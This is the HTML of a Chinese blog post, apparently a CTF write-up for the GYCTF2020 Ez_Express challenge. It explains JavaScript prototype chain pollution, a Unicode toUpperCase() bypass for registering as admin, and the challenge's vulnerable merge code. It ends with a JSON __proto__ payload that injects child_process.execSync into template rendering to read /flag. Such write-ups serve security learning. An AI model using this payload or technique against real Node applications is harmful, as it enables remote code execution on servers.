@@ -1,0 +1,239 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>GYCTF2020：Ez_Express - H3ng</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="H3ng,"> 
+    <meta name="description" content="参考：https://www.cnblogs.com/LEOGG321/p/13448463.html
+
+原型链与原型链污染https://www.cnblogs.com/loveyaxin/p/1,"> 
+    <meta name="author" content="H3ng"> 
+    <link rel="alternative" href="/atom.xml" title="H3ng" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+<meta name="generator" content="Hexo 5.2.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">H3ng</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://LXH3ng.github.io"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">GYCTF2020：Ez_Express</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">GYCTF2020：Ez_Express</h1>
+        <div class="stuff">
+            <span>十月 12, 2021</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">js原型链污染</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LEOGG321/p/13448463.html">https://www.cnblogs.com/LEOGG321/p/13448463.html</a></p>
+<p><img src="/2021/10/12/gyctf2020-ez-express/image-20211012184324370.png" alt="image-20211012184324370"></p>
+<h1 id="原型链与原型链污染"><a href="#原型链与原型链污染" class="headerlink" title="原型链与原型链污染"></a>原型链与原型链污染</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/loveyaxin/p/11151586.html">https://www.cnblogs.com/loveyaxin/p/11151586.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/escape-w/p/12347705.html">https://www.cnblogs.com/escape-w/p/12347705.html</a></p>
+<p>原型链的特性：</p>
+<p>在我们调用一个对象的某属性时：</p>
+<pre><code>1.对象(obj)中寻找这一属性
+2.如果找不到，则在obj.__proto__中寻找属性
+3.如果仍然找不到，则继续在obj.__proto__.__proto__中寻找这一属性</code></pre>
+<p>以上机制被称为js的prototype继承链。而原型链污染就与这有关</p>
+<p>原型链污染定义：</p>
+<pre><code>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染</code></pre>
+<p>看见merge，clone函数，可以往原型链污染靠</p>
+<h1 id="toUpperCase-toLowerCase-绕过"><a href="#toUpperCase-toLowerCase-绕过" class="headerlink" title="toUpperCase()/toLowerCase()绕过"></a>toUpperCase()/toLowerCase()绕过</h1><p>Phithon的一篇博客：<a target="_blank" rel="noopener" href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p>
+<p>特殊字符绕过</p>
+<p>其中混入了两个奇特的字符”ı”、”ſ”。</p>
+<p>这两个字符的“大写”是I和S。也就是说”ı”.toUpperCase() == ‘I’，”ſ”.toUpperCase() == ‘S’。通过这个小特性可以绕过一些限制。</p>
+<p>这个”K”的“小写”字符是k，也就是”K”.toLowerCase() == ‘k’.</p>
+<p><img src="/2021/10/12/gyctf2020-ez-express/image-20211012185241629.png" alt="image-20211012185241629" style="zoom:50%;"><img src="/2021/10/12/gyctf2020-ez-express/image-20211012185302162.png" alt="image-20211012185302162" style="zoom:50%;"></p>
+<h1 id="web-routes-index-js"><a href="#web-routes-index-js" class="headerlink" title="web\routes\index.js"></a>web\routes\index.js</h1><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> merge <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> a
+<span class="token punctuation">}</span></code></pre>
+<pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> clone <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+ <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>一个判断，merge()、clone()存在原型链：</p>
+<pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeKeyword</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('forbid word');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span> 
+   <span class="token punctuation">}</span>
+    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">=</span><span class="token punctuation">{</span>
+      <span class="token string">'user'</span><span class="token punctuation">:</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+      <span class="token string">'passwd'</span><span class="token punctuation">:</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token punctuation">,</span>
+      <span class="token string">'isLogin'</span><span class="token punctuation">:</span><span class="token boolean">false</span>
+    <span class="token punctuation">}</span>
+    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+  <span class="token punctuation">}</span>
+  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">{</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('register first');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">==</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token operator">&amp;&amp;</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token operator">==</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>passwd<span class="token punctuation">)</span><span class="token punctuation">{</span>
+      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isLogin<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">else</span><span class="token punctuation">{</span>
+      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('error passwd');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">}</span>
+
+  <span class="token punctuation">}</span>
+  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>可以看到验证了注册的用户名不能为admin（大小写），不过有个地方可以注意到</p>
+<pre><code>'user':req.body.userid.toUpperCase(),</code></pre>
+<pre class=" language-js"><code class="language-js">router<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'user'</span><span class="token punctuation">:</span>res<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre>
+<p>注册admın账号</p>
+<p>也就是可以通过污染<code>outputFunctionName</code>进行SSTI</p>
+<p>于是抓<code>/action</code>的包，<code>Content-Type</code>设为<code>application/json</code></p>
+<p><strong>payload</strong></p>
+<pre class=" language-js"><code class="language-js"><span class="token punctuation">{</span><span class="token string">"lua"</span><span class="token punctuation">:</span><span class="token string">"a"</span><span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">:</span><span class="token punctuation">{</span><span class="token string">"outputFunctionName"</span><span class="token punctuation">:</span>"a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">return</span> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span>constructor<span class="token punctuation">.</span><span class="token function">_load</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//"},"Submit":""}</span></code></pre>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='//music/1.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">1.</span> <span class="toc-text">原型链与原型链污染</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#toUpperCase-toLowerCase-%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">toUpperCase()&#x2F;toLowerCase()绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web-routes-index-js"><span class="toc-number">3.</span> <span class="toc-text">web\routes\index.js</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7}});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
